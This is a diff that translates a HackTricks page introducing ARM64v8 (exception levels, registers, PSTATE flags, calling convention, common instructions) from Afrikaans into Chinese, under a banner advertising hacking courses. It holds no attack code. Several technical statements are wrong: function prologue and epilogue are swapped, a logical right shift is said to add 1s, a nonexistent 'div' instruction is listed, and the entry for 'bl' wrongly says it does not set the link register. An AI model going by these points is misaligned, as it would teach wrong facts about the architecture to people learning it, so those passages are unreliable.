@@ -1,274 +1,276 @@
-# Inleiding tot ARM64v8
+# Introduction to ARM64v8
 
 {% hint style="success" %}
-Leer & oefen AWS Hacking:<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
-Leer & oefen GCP Hacking: <img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+学习和实践 AWS 黑客技术：<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line">\
+学习和实践 GCP 黑客技术：<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Ondersteun HackTricks</summary>
+<summary>支持 HackTricks</summary>
 
-* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
-* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
+* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass) 或 **在 Twitter 上关注** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub 仓库提交 PR 分享黑客技巧。
 
 </details>
 {% endhint %}
 
-## **Uitsondering Vlakke - EL (ARM64v8)**
+## **异常级别 - EL (ARM64v8)**
 
-In ARMv8 argitektuur, definieer uitvoeringsvlakke, bekend as Uitsondering Vlakke (ELs), die voorregvlak en vermoëns van die uitvoeringsomgewing. Daar is vier uitsondering vlakke, wat wissel van EL0 tot EL3, elk met 'n ander doel:
+在 ARMv8 架构中，执行级别称为异常级别（ELs），定义了执行环境的特权级别和能力。共有四个异常级别，从 EL0 到 EL3，每个级别有不同的用途：
 
-1. **EL0 - Gebruikersmodus**:
-* Dit is die minste voorreg vlak en word gebruik om gewone toepassingskode uit te voer.
-* Toepassings wat op EL0 loop, is van mekaar en van die stelselsagteware geïsoleer, wat sekuriteit en stabiliteit verbeter.
-2. **EL1 - Bedryfstelsel Kernel Modus**:
-* Meeste bedryfstelsel kerne loop op hierdie vlak.
-* EL1 het meer voorregte as EL0 en kan toegang tot stelselhulpbronne hê, maar met sekere beperkings om stelselintegriteit te verseker.
-3. **EL2 - Hypervisor Modus**:
-* Hierdie vlak word gebruik vir virtualisering. 'n Hypervisor wat op EL2 loop, kan verskeie bedryfstelsels bestuur (elke in sy eie EL1) wat op dieselfde fisiese hardeware loop.
-* EL2 bied kenmerke vir isolasie en beheer van die gevirtualiseerde omgewings.
-4. **EL3 - Veilige Monitor Modus**:
-* Dit is die mees voorregte vlak en word dikwels gebruik vir veilige opstart en vertroude uitvoeringsomgewings.
-* EL3 kan toegang en beheer tussen veilige en nie-veilige toestande bestuur (soos veilige opstart, vertroude OS, ens.).
+1. **EL0 - 用户模式**：
+* 这是特权级别最低的级别，用于执行常规应用程序代码。
+* 在 EL0 运行的应用程序相互隔离，并与系统软件隔离，从而增强安全性和稳定性。
+2. **EL1 - 操作系统内核模式**：
+* 大多数操作系统内核在此级别运行。
+* EL1 的特权高于 EL0，可以访问系统资源，但有一些限制以确保系统完整性。
+3. **EL2 - 虚拟机监控器模式**：
+* 此级别用于虚拟化。在 EL2 运行的虚拟机监控器可以管理多个操作系统（每个操作系统在自己的 EL1 中）在同一物理硬件上运行。
+* EL2 提供了隔离和控制虚拟化环境的功能。
+4. **EL3 - 安全监控模式**：
+* 这是特权级别最高的级别，通常用于安全启动和受信执行环境。
+* EL3 可以管理和控制安全状态与非安全状态之间的访问（例如安全启动、受信操作系统等）。
 
-Die gebruik van hierdie vlakke stel 'n gestruktureerde en veilige manier in om verskillende aspekte van die stelsel te bestuur, van gebruikers toepassings tot die mees voorregte stelselsagteware. ARMv8 se benadering tot voorregte vlakke help om verskillende stelselskomponente effektief te isoleer, wat die sekuriteit en robuustheid van die stelsel verbeter.
+使用这些级别可以以结构化和安全的方式管理系统的不同方面，从用户应用程序到最特权的系统软件。ARMv8 对特权级别的处理有助于有效隔离不同的系统组件，从而增强系统的安全性和稳健性。
 
-## **Registers (ARM64v8)**
+## **寄存器 (ARM64v8)**
 
-ARM64 het **31 algemene registers**, gemerk `x0` tot `x30`. Elke kan 'n **64-bit** (8-byte) waarde stoor. Vir operasies wat slegs 32-bit waardes vereis, kan dieselfde registers in 'n 32-bit modus toeganklik wees met die name w0 tot w30.
+ARM64 有 **31 个通用寄存器**，标记为 `x0` 到 `x30`。每个寄存器可以存储一个 **64 位**（8 字节）值。对于只需要 32 位值的操作，可以使用 w0 到 w30 的名称以 32 位模式访问相同的寄存器。
 
-1. **`x0`** tot **`x7`** - Hierdie word tipies gebruik as skrap registers en om parameters aan subrutines oor te dra.
-* **`x0`** dra ook die terugdata van 'n funksie
-2. **`x8`** - In die Linux-kernel, word `x8` gebruik as die stelselaanroepnommer vir die `svc` instruksie. **In macOS is dit x16 wat gebruik word!**
-3. **`x9`** tot **`x15`** - Meer tydelike registers, dikwels gebruik vir plaaslike veranderlikes.
-4. **`x16`** en **`x17`** - **Intra-prosedurele Oproep Registers**. Tydelike registers vir onmiddellike waardes. Hulle word ook gebruik vir indirekte funksie oproepe en PLT (Procedure Linkage Table) stubs.
-* **`x16`** word gebruik as die **stelselaanroepnommer** vir die **`svc`** instruksie in **macOS**.
-5. **`x18`** - **Platform register**. Dit kan as 'n algemene register gebruik word, maar op sommige platforms is hierdie register gereserveer vir platform-spesifieke gebruike: Punter na die huidige draad-omgewing blok in Windows, of om na die huidige **uitvoerende taakstruktuur in die linux kernel** te verwys.
-6. **`x19`** tot **`x28`** - Hierdie is kalteer-bewaar registers. 'n Funksie moet hierdie registers se waardes vir sy oproeper behou, so hulle word in die stapel gestoor en herwin voordat hulle teruggaan na die oproeper.
-7. **`x29`** - **Raamwyser** om die stapelraam te volg. Wanneer 'n nuwe stapelraam geskep word omdat 'n funksie opgeroep word, word die **`x29`** register **in die stapel gestoor** en die **nuwe** raamwyser adres is (**`sp`** adres) **in hierdie register gestoor**.
-* Hierdie register kan ook as 'n **algemene register** gebruik word alhoewel dit gewoonlik as 'n verwysing na **lokale veranderlikes** gebruik word.
-8. **`x30`** of **`lr`**- **Link register**. Dit hou die **terugadres** wanneer 'n `BL` (Branch with Link) of `BLR` (Branch with Link to Register) instruksie uitgevoer word deur die **`pc`** waarde in hierdie register te stoor.
-* Dit kan ook soos enige ander register gebruik word.
-* As die huidige funksie 'n nuwe funksie gaan oproep en dus `lr` gaan oorskryf, sal dit dit aan die begin in die stapel stoor, dit is die epiloog (`stp x29, x30 , [sp, #-48]; mov x29, sp` -> Stoor `fp` en `lr`, genereer ruimte en kry nuwe `fp`) en dit aan die einde herwin, dit is die proloog (`ldp x29, x30, [sp], #48; ret` -> Herwin `fp` en `lr` en keer terug).
-9. **`sp`** - **Stapelwyser**, gebruik om die bokant van die stapel te volg.
-* die **`sp`** waarde moet altyd ten minste 'n **quadword** **uitlijning** of 'n uitlijningsfout mag voorkom.
-10. **`pc`** - **Program teller**, wat na die volgende instruksie wys. Hierdie register kan slegs opgedateer word deur uitsondering generasies, uitsondering terugkeerde, en takke. Die enigste gewone instruksies wat hierdie register kan lees, is tak met link instruksies (BL, BLR) om die **`pc`** adres in **`lr`** (Link Register) te stoor.
-11. **`xzr`** - **Nul register**. Ook genoem **`wzr`** in sy **32**-bit register vorm. Kan gebruik word om die nul waarde maklik te kry (gewone operasie) of om vergelykings te doen met **`subs`** soos **`subs XZR, Xn, #10`** wat die resulterende data nêrens stoor (in **`xzr`**).
+1. **`x0`** 到 **`x7`** - 这些通常用作临时寄存器，并用于将参数传递给子例程。
+* **`x0`** 还携带函数的返回数据。
+2. **`x8`** - 在 Linux 内核中，`x8` 用作 `svc` 指令的系统调用号。**在 macOS 中使用的是 x16！**
+3. **`x9`** 到 **`x15`** - 更多的临时寄存器，通常用于局部变量。
+4. **`x16`** 和 **`x17`** - **过程内调用寄存器**。用于立即值的临时寄存器。它们也用于间接函数调用和 PLT（过程链接表）存根。
+* **`x16`** 在 **macOS** 中用作 **`svc`** 指令的 **系统调用号**。
+5. **`x18`** - **平台寄存器**。可以用作通用寄存器，但在某些平台上，此寄存器保留用于平台特定用途：在 Windows 中指向当前线程环境块，或指向当前 **执行任务结构在 Linux 内核**。
+6. **`x19`** 到 **`x28`** - 这些是被调用者保存的寄存器。函数必须为其调用者保留这些寄存器的值，因此它们存储在堆栈中，并在返回调用者之前恢复。
+7. **`x29`** - **帧指针**，用于跟踪堆栈帧。当由于调用函数而创建新的堆栈帧时，**`x29`** 寄存器会 **存储在堆栈中**，并且 **新的** 帧指针地址（**`sp`** 地址）会 **存储在此寄存器中**。
+* 此寄存器也可以用作 **通用寄存器**，尽管通常用作对 **局部变量** 的引用。
+8. **`x30`** 或 **`lr`** - **链接寄存器**。它在执行 `BL`（带链接的分支）或 `BLR`（带链接到寄存器的分支）指令时保存 **返回地址**，通过将 **`pc`** 值存储在此寄存器中。
+* 它也可以像其他寄存器一样使用。
+* 如果当前函数将调用新函数并因此覆盖 `lr`，它将在开始时将其存储在堆栈中，这是尾声（`stp x29, x30 , [sp, #-48]; mov x29, sp` -> 存储 `fp` 和 `lr`，生成空间并获取新 `fp`）并在结束时恢复，这是序言（`ldp x29, x30, [sp], #48; ret` -> 恢复 `fp` 和 `lr` 并返回）。
+9. **`sp`** - **堆栈指针**，用于跟踪堆栈的顶部。
+* **`sp`** 值应始终保持至少为 **四字** **对齐**，否则可能会发生对齐异常。
+10. **`pc`** - **程序计数器**，指向下一条指令。此寄存器只能通过异常生成、异常返回和分支进行更新。唯一可以读取此寄存器的普通指令是带链接的分支指令（BL，BLR），以将 **`pc`** 地址存储在 **`lr`**（链接寄存器）中。
+11. **`xzr`** - **零寄存器**。在其 **32** 位寄存器形式中也称为 **`wzr`**。可以用来轻松获取零值（常见操作）或使用 **`subs`** 进行比较，如 **`subs XZR, Xn, #10`**，将结果数据存储在无处（在 **`xzr`** 中）。
 
-Die **`Wn`** registers is die **32bit** weergawe van die **`Xn`** register.
+**`Wn`** 寄存器是 **`Xn`** 寄存器的 **32 位** 版本。
 
-### SIMD en Vervaardigingsregisters
+### SIMD 和浮点寄存器
 
-Boonop is daar nog **32 registers van 128bit lengte** wat gebruik kan word in geoptimaliseerde enkele instruksie meervoudige data (SIMD) operasies en vir die uitvoering van drijvende-komma rekenkunde. Hierdie word die Vn registers genoem alhoewel hulle ook in **64**-bit, **32**-bit, **16**-bit en **8**-bit kan werk en dan word hulle **`Qn`**, **`Dn`**, **`Sn`**, **`Hn`** en **`Bn`** genoem.
+此外，还有另外 **32 个 128 位长度的寄存器**，可用于优化的单指令多数据（SIMD）操作和执行浮点运算。这些称为 Vn 寄存器，尽管它们也可以以 **64** 位、**32** 位、**16** 位和 **8** 位操作，然后称为 **`Qn`**、**`Dn`**、**`Sn`**、**`Hn`** 和 **`Bn`**。
 
-### Stelselsregisters
+### 系统寄存器
 
-**Daar is honderde stelselsregisters**, ook bekend as spesiale-doel registers (SPRs), wat gebruik word vir **monitering** en **beheer** van **prosessor** gedrag.\
-Hulle kan slegs gelees of gestel word met die toegewyde spesiale instruksie **`mrs`** en **`msr`**.
+**有数百个系统寄存器**，也称为特殊用途寄存器（SPRs），用于 **监控** 和 **控制** **处理器** 行为。\
+它们只能通过专用特殊指令 **`mrs`** 和 **`msr`** 进行读取或设置。
 
-Die spesiale registers **`TPIDR_EL0`** en **`TPIDDR_EL0`** word algemeen aangetref wanneer omgekeerde ingenieurswese gedoen word. Die `EL0` agtervoegsel dui die **minimale uitsondering** aan waaruit die register toeganklik is (in hierdie geval is EL0 die gewone uitsondering (voorreg) vlak waaroor gewone programme loop).\
-Hulle word dikwels gebruik om die **basisadres van die draad-lokale berging** geheue streek te stoor. Gewoonlik is die eerste een leesbaar en skryfbaar vir programme wat in EL0 loop, maar die tweede kan van EL0 gelees en van EL1 geskryf word (soos kernel).
+特殊寄存器 **`TPIDR_EL0`** 和 **`TPIDDR_EL0`** 在逆向工程中常见。`EL0` 后缀表示可以访问寄存器的 **最小异常**（在这种情况下，EL0 是常规程序运行的常规异常（特权）级别）。\
+它们通常用于存储内存中 **线程局部存储** 区域的 **基地址**。通常，第一个寄存器对在 EL0 中运行的程序可读可写，但第二个寄存器可以从 EL0 读取并从 EL1 写入（如内核）。
 
-* `mrs x0, TPIDR_EL0 ; Lees TPIDR_EL0 in x0`
-* `msr TPIDR_EL0, X0 ; Skryf x0 in TPIDR_EL0`
+* `mrs x0, TPIDR_EL0 ; 将 TPIDR_EL0 读取到 x0`
+* `msr TPIDR_EL0, X0 ; 将 x0 写入 TPIDR_EL0`
 
 ### **PSTATE**
 
-**PSTATE** bevat verskeie proses komponente wat in die bedryfstelsel-sigbare **`SPSR_ELx`** spesiale register geserialiseer is, wat X die **toestemming** **vlak van die geaktiveerde** uitsondering aandui (dit stel in staat om die proses toestand te herstel wanneer die uitsondering eindig).\
-Hierdie is die toeganklike velde:
+**PSTATE** 包含多个进程组件，序列化到操作系统可见的 **`SPSR_ELx`** 特殊寄存器中，X 是触发异常的 **权限** **级别**（这允许在异常结束时恢复进程状态）。\
+这些是可访问的字段：
 
 <figure><img src="../../../.gitbook/assets/image (1196).png" alt=""><figcaption></figcaption></figure>
 
-* Die **`N`**, **`Z`**, **`C`** en **`V`** toestand vlae:
-* **`N`** beteken die operasie het 'n negatiewe resultaat opgelewer
-* **`Z`** beteken die operasie het nul opgelewer
-* **`C`** beteken die operasie het 'n dra oor
-* **`V`** beteken die operasie het 'n onderteken oorloop opgelewer:
-* Die som van twee positiewe getalle lewer 'n negatiewe resultaat.
-* Die som van twee negatiewe getalle lewer 'n positiewe resultaat.
-* In aftrekking, wanneer 'n groot negatiewe getal van 'n kleiner positiewe getal (of omgekeerd) afgetrek word, en die resultaat nie binne die reeks van die gegewe bitgrootte verteenwoordig kan word nie.
-* Dit is duidelik dat die prosessor nie weet of die operasie onderteken is of nie, so dit sal C en V in die operasies nagaan en aandui of 'n dra plaasgevind het in die geval dit onderteken of nie-onderteken was.
+* **`N`**、**`Z`**、**`C`** 和 **`V`** 条件标志：
+* **`N`** 表示操作产生了负结果
+* **`Z`** 表示操作产生了零
+* **`C`** 表示操作产生了进位
+* **`V`** 表示操作产生了有符号溢出：
+* 两个正数的和产生负结果。
+* 两个负数的和产生正结果。
+* 在减法中，当从较小的正数中减去较大的负数（或反之），且结果无法在给定位大小的范围内表示时。
+* 显然，处理器不知道操作是有符号的还是无符号的，因此它将在操作中检查 C 和 V，并在发生进位的情况下指示。
 
 {% hint style="warning" %}
-Nie alle instruksies werk hierdie vlae op nie. Sommige soos **`CMP`** of **`TST`** doen, en ander wat 'n s agtervoegsel het soos **`ADDS`** doen dit ook.
+并非所有指令都会更新这些标志。一些指令如 **`CMP`** 或 **`TST`** 会更新，其他带有 s 后缀的指令如 **`ADDS`** 也会更新。
 {% endhint %}
 
-* Die huidige **register breedte (`nRW`) vlag**: As die vlag die waarde 0 hou, sal die program in die AArch64 uitvoeringsstaat loop sodra dit hervat word.
-* Die huidige **Uitsondering Vlak** (**`EL`**): 'n Gewone program wat in EL0 loop, sal die waarde 0 hê
-* Die **enkele stap** vlag (**`SS`**): Gebruik deur debuggers om enkelstap deur die SS vlag op 1 in **`SPSR_ELx`** deur 'n uitsondering te stel. Die program sal 'n stap uitvoer en 'n enkele stap uitsondering uitreik.
-* Die **onwettige uitsondering** toestand vlag (**`IL`**): Dit word gebruik om aan te dui wanneer 'n voorregte sagteware 'n ongeldige uitsondering vlak oordrag uitvoer, hierdie vlag word op 1 gestel en die prosessor aktiveer 'n onwettige toestand uitsondering.
-* Die **`DAIF`** vlae: Hierdie vlae stel 'n voorregte program in staat om selektief sekere eksterne uitsonderings te masker.
-* As **`A`** 1 is, beteken dit dat **asynchrone afbrake** geaktiveer sal word. Die **`I`** stel in om te reageer op eksterne hardeware **Interrupts Requests** (IRQs). en die F is verwant aan **Fast Interrupt Requests** (FIRs).
-* Die **stapelwyser seleksie** vlae (**`SPS`**): Voorregte programme wat in EL1 en hoër loop, kan tussen die gebruik van hul eie stapelwyser register en die gebruikersmodel een (bv. tussen `SP_EL1` en `EL0`) wissel. Hierdie skakeling word uitgevoer deur na die **`SPSel`** spesiale register te skryf. Dit kan nie van EL0 gedoen word nie.
+* 当前 **寄存器宽度 (`nRW`) 标志**：如果标志的值为 0，则程序在恢复后将以 AArch64 执行状态运行。
+* 当前 **异常级别** (**`EL`**)：在 EL0 中运行的常规程序将具有值 0。
+* **单步执行** 标志 (**`SS`**)：由调试器使用，通过在异常中将 SS 标志设置为 1 来单步执行。程序将执行一步并发出单步异常。
+* **非法异常** 状态标志 (**`IL`**)：用于标记特权软件执行无效异常级别转移时，此标志设置为 1，处理器触发非法状态异常。
+* **`DAIF`** 标志：这些标志允许特权程序选择性地屏蔽某些外部异常。
+* 如果 **`A`** 为 1，则表示将触发 **异步中止**。**`I`** 配置为响应外部硬件 **中断请求**（IRQ）。F 与 **快速中断请求**（FIR）相关。
+* **堆栈指针选择** 标志 (**`SPS`**)：在 EL1 及以上运行的特权程序可以在使用自己的堆栈指针寄存器和用户模型之间切换（例如，在 `SP_EL1` 和 `EL0` 之间）。此切换通过写入 **`SPSel`** 特殊寄存器执行。此操作无法从 EL0 完成。
 
-## **Oproep Konvensie (ARM64v8)**
+## **调用约定 (ARM64v8)**
 
-Die ARM64 oproep konvensie spesifiseer dat die **eerste agt parameters** aan 'n funksie in registers **`x0` tot `x7`** oorgedra word. **Addisionele** parameters word op die **stapel** oorgedra. Die **terug** waarde word teruggegee in register **`x0`**, of in **`x1`** as dit ook **128 bits lank** is. Die **`x19`** tot **`x30`** en **`sp`** registers moet **bewaar** word oor funksie oproepe.
+ARM64 调用约定规定，**前八个参数**通过寄存器 **`x0` 到 `x7`** 传递。**额外**参数通过 **堆栈** 传递。**返回**值通过寄存器 **`x0`** 返回，或者在 **`x1`** 中返回 **如果其长度为 128 位**。**`x19`** 到 **`x30`** 和 **`sp`** 寄存器必须在函数调用之间 **保留**。
 
-Wanneer 'n funksie in assembly gelees word, soek na die **funksie proloog en epiloog**. Die **proloog** behels gewoonlik **die stoor van die raamwyser (`x29`)**, **opstelling** van 'n **nuwe raamwyser**, en **toewysing van stapelruimte**. Die **epiloog** behels gewoonlik **die herstel van die gestoor raamwyser** en **terugkeer** van die funksie.
+在阅读汇编中的函数时，查找 **函数序言和尾声**。**序言** 通常涉及 **保存帧指针（`x29`）**、**设置** 新的 **帧指针** 和 **分配堆栈空间**。**尾声** 通常涉及 **恢复保存的帧指针** 和 **从函数返回**。
 
-### Oproep Konvensie in Swift
+### Swift 中的调用约定
 
-Swift het sy eie **oproep konvensie** wat gevind kan word in [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64)
+Swift 有其自己的 **调用约定**，可以在 [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64) 中找到。
 
-## **Algemene Instruksies (ARM64v8)**
+## **常见指令 (ARM64v8)**
 
-ARM64 instruksies het oor die algemeen die **formaat `opcode dst, src1, src2`**, waar **`opcode`** die **operasie** is wat uitgevoer moet word (soos `add`, `sub`, `mov`, ens.), **`dst`** is die **bestemmings** register waar die resultaat gestoor sal word, en **`src1`** en **`src2`** is die **bron** registers. Onmiddellike waardes kan ook in plaas van bron registers gebruik word.
+ARM64 指令通常具有 **格式 `opcode dst, src1, src2`**，其中 **`opcode`** 是要执行的 **操作**（如 `add`、`sub`、`mov` 等），**`dst`** 是 **目标** 寄存器，结果将存储在此寄存器中，**`src1`** 和 **`src2`** 是 **源** 寄存器。立即数值也可以替代源寄存器使用。
 
-* **`mov`**: **Beweeg** 'n waarde van een **register** na 'n ander.
-* Voorbeeld: `mov x0, x1` — Dit beweeg die waarde van `x1` na `x0`.
-* **`ldr`**: **Laai** 'n waarde van **geheue** in 'n **register**.
-* Voorbeeld: `ldr x0, [x1]` — Dit laai 'n waarde van die geheue ligging wat deur `x1` aangedui word in `x0`.
-* **Offset modus**: 'n offset wat die oorspronklike punter beïnvloed, word aangedui, byvoorbeeld:
-* `ldr x2, [x1, #8]`, dit sal die waarde van x1 + 8 in x2 laai
-* `ldr x2, [x0, x1, lsl #2]`, dit sal 'n objek van die array x0 in x2 laai, vanaf die posisie x1 (indeks) \* 4
-* **Pre-geïndekseerde modus**: Dit sal berekeninge op die oorspronklike toepas, die resultaat kry en ook die nuwe oorspronklike in die oorspronklike stoor.
-* `ldr x2, [x1, #8]!`, dit sal `x1 + 8` in `x2` laai en in `x1` die resultaat van `x1 + 8` stoor
-* `str lr, [sp, #-4]!`, Stoor die link register in sp en werk die register sp op
-* **Post-geïndekseerde modus**: Dit is soos die vorige een, maar die geheue adres word toeganklik gemaak en dan word die offset bereken en gestoor.
-* `ldr x0, [x1], #8`, laai `x1` in `x0` en werk x1 op met `x1 + 8`
-* **PC-relatiewe adressering**: In hierdie geval word die adres om te laai bereken relatief tot die PC register
-* `ldr x1, =_start`, Dit sal die adres waar die `_start` simbool begin in x1 laai relatief tot die huidige PC.
-* **`str`**: **Stoor** 'n waarde van 'n **register** in **geheue**.
-* Voorbeeld: `str x0, [x1]` — Dit stoor die waarde in `x0` in die geheue ligging wat deur `x1` aangedui word.
-* **`ldp`**: **Laai Paar Registers**. Hierdie instruksie **laai twee registers** van **aaneengeskakelde geheue** liggings. Die geheue adres word tipies gevorm deur 'n offset by die waarde in 'n ander register te voeg.
-* Voorbeeld: `ldp x0, x1, [x2]` — Dit laai `x0` en `x1` van die geheue liggings by `x2` en `x2 + 8`, onderskeidelik.
-* **`stp`**: **Stoor Paar Registers**. Hierdie instruksie **stoor twee registers** na **aaneengeskakelde geheue** liggings. Die geheue adres word tipies gevorm deur 'n offset by die waarde in 'n ander register te voeg.
-* Voorbeeld: `stp x0, x1, [sp]` — Dit stoor `x0` en `x1` na die geheue liggings by `sp` en `sp + 8`, onderskeidelik.
-* `stp x0, x1, [sp, #16]!` — Dit stoor `x0` en `x1` na die geheue liggings by `sp+16` en `sp + 24`, onderskeidelik, en werk `sp` op met `sp+16`.
-* **`add`**: **Voeg** die waardes van twee registers by en stoor die resultaat in 'n register.
-* Sintaksis: add(s) Xn1, Xn2, Xn3 | #imm, \[shift #N | RRX]
-* Xn1 -> Bestemming
-* Xn2 -> Operand 1
-* Xn3 | #imm -> Operando 2 (register of onmiddellik)
-* \[shift #N | RRX] -> Voer 'n verskuiwing uit of bel RRX
-* Voorbeeld: `add x0, x1, x2` — Dit voeg die waardes in `x1` en `x2` saam en stoor die resultaat in `x0`.
-* `add x5, x5, #1, lsl #12` — Dit is gelyk aan 4096 (1 verskuiwer 12 keer) -> 1 0000 0000 0000 0000
-* **`adds`** Dit voer 'n `add` uit en werk die vlae op
-* **`sub`**: **Trek** die waardes van twee registers af en stoor die resultaat in 'n register.
-* Kyk na **`add`** **sintaksis**.
-* Voorbeeld: `sub x0, x1, x2` — Dit trek die waarde in `x2` van `x1` af en stoor die resultaat in `x0`.
-* **`subs`** Dit is soos sub maar werk die vlag op
-* **`mul`**: **Vermenigvuldig** die waardes van **twee registers** en stoor die resultaat in 'n register.
-* Voorbeeld: `mul x0, x1, x2` — Dit vermenigvuldig die waardes in `x1` en `x2` en stoor die resultaat in `x0`.
-* **`div`**: **Deel** die waarde van een register deur 'n ander en stoor die resultaat in 'n register.
-* Voorbeeld: `div x0, x1, x2` — Dit deel die waarde in `x1` deur `x2` en stoor die resultaat in `x0`.
-* **`lsl`**, **`lsr`**, **`asr`**, **`ror`, `rrx`**:
-* **Logiese verskuiwing links**: Voeg 0s van die einde by en beweeg die ander bits vorentoe (vermenigvuldig met n-keer 2)
-* **Logiese verskuiwing regs**: Voeg 1s aan die begin by en beweeg die ander bits agtertoe (deel deur n-keer 2 in nie-onderteken)
-* **Arithmetiese verskuiwing regs**: Soos **`lsr`**, maar in plaas daarvan om 0s by te voeg, as die mees betekenisvolle bit 'n 1 is, **word 1s bygevoeg** (deel deur n-keer 2 in onderteken)
-* **Draai regs**: Soos **`lsr`** maar wat ook al van die regterkant verwyder word, word aan die linkerkant bygevoeg
-* **Draai Regs met Uitbreiding**: Soos **`ror`**, maar met die dra vlag as die "mees betekenisvolle bit". So die dra vlag word na die bit 31 verskuif en die verwyderde bit na die dra vlag.
-* **`bfm`**: **Bit Veld Beweeg**, hierdie operasies **kopieer bits `0...n`** van 'n waarde en plaas hulle in posisies **`m..m+n`**. Die **`#s`** spesifiseer die **linkerste bit** posisie en **`#r`** die **draai regs hoeveelheid**.
-* Bitfiled beweeg: `BFM Xd, Xn, #r`
-* Onderteken Bitfield beweeg: `SBFM Xd, Xn, #r, #s`
-* Ononderteken Bitfield beweeg: `UBFM Xd, Xn, #r, #s`
-* **Bitfield Uittrek en Invoeg:** Kopieer 'n bitveld van 'n register en kopieer dit na 'n ander register.
-* **`BFI X1, X2, #3, #4`** Voeg 4 bits van X2 vanaf die 3de bit van X1 in
-* **`BFXIL X1, X2, #3, #4`** Trek 4 bits vanaf die 3de bit van X2 uit en kopieer dit na X1
-* **`SBFIZ X1, X2, #3, #4`** Onderteken-uitbrei 4 bits van X2 en voeg dit in X1 in wat by bit posisie 3 begin en die regter bits nulmaak
-* **`SBFX X1, X2, #3, #4`** Trek 4 bits vanaf bit 3 van X2 uit, onderteken uitbrei dit, en plaas die resultaat in X1
-* **`UBFIZ X1, X2, #3, #4`** Nul-uitbrei 4 bits van X2 en voeg dit in X1 in wat by bit posisie 3 begin en die regter bits nulmaak
-* **`UBFX X1, X2, #3, #4`** Trek 4 bits vanaf bit 3 van X2 uit en plaas die nul-uitgebreide resultaat in X1.
-* **Onderteken Uitbrei na X:** Brei die teken uit (of voeg net 0s in die ononderteken weergawe) van 'n waarde om operasies daarmee uit te voer:
-* **`SXTB X1, W2`** Brei die teken van 'n byte **van W2 na X1** uit (`W2` is die helfte van `X2`) om die 64bits te vul
-* **`SXTH X1, W2`** Brei die teken van 'n 16bit getal **van W2 na X1** uit om die 64bits te vul
-* **`SXTW X1, W2`** Brei die teken van 'n byte **van W2 na X1** uit om die 64bits te vul
-* **`UXTB X1, W2`** Voeg 0s (ononderteken) by 'n byte **van W2 na X1** om die 64bits te vul
-* **`extr`:** Trek bits uit 'n gespesifiseerde **paar registers gekombineer**.
-* Voorbeeld: `EXTR W3, W2, W1, #3` Dit sal **W1+W2** kombineer en **van bit 3 van W2 tot bit 3 van W1** kry en dit in W3 stoor.
-* **`cmp`**: **Vergelyk** twee registers en stel toestand vlae. Dit is 'n **alias van `subs`** wat die bestemming register na die nul register stel. Nuttig om te weet of `m == n`.
-* Dit ondersteun die **dieselfde sintaksis as `subs`**
-* Voorbeeld: `cmp x0, x1` — Dit vergelyk die waardes in `x0` en `x1` en stel die toestand vlae ooreenkomstig op.
-* **`cmn`**: **Vergelyk negatiewe** operand. In hierdie geval is dit 'n **alias van `adds`** en ondersteun die dieselfde sintaksis. Nuttig om te weet of `m == -n`.
-* **`ccmp`**: Voorwaardelike vergelyking, dit is 'n vergelyking wat slegs uitgevoer sal word as 'n vorige vergelyking waar was en sal spesifiek nzcv bits stel.
-* `cmp x1, x2; ccmp x3, x4, 0, NE; blt _func` -> as x1 != x2 en x3 < x4, spring na func
-* Dit is omdat **`ccmp`** slegs uitgevoer sal word as die **vorige `cmp` 'n `NE` was**, as dit nie was nie, sal die bits `nzcv` op 0 gestel word (wat nie die `blt` vergelyking sal bevredig nie).
-* Dit kan ook as `ccmn` gebruik word (dieselfde maar negatief, soos `cmp` teenoor `cmn`).
-* **`tst`**: Dit kyk of enige van die vergelykings se waardes albei 1 is (dit werk soos 'n ANDS sonder om die resultaat nêrens te stoor). Dit is nuttig om 'n register met 'n waarde te kontroleer en te kyk of enige van die bits van die register wat in die waarde aangedui word, 1 is.
-* Voorbeeld: `tst X1, #7` Kyk of enige van die laaste 3 bits van X1 1 is
-* **`teq`**: XOR operasie wat die resultaat verwerp
-* **`b`**: Onvoorwaardelike Tak
-* Voorbeeld: `b myFunction`
-* Let daarop dat dit nie die link register met die terugadres sal vul nie (nie geskik vir subrutine oproepe wat terug moet keer nie)
-* **`bl`**: **Tak** met link, gebruik om 'n **subrutine** te **noem**. Stoor die **terugadres in `x30`**.
-* Voorbeeld: `bl myFunction` — Dit noem die funksie `myFunction` en stoor die terugadres in `x30`.
-* Let daarop dat dit nie die link register met die terugadres sal vul nie (nie geskik vir subrutine oproepe wat terug moet keer nie)
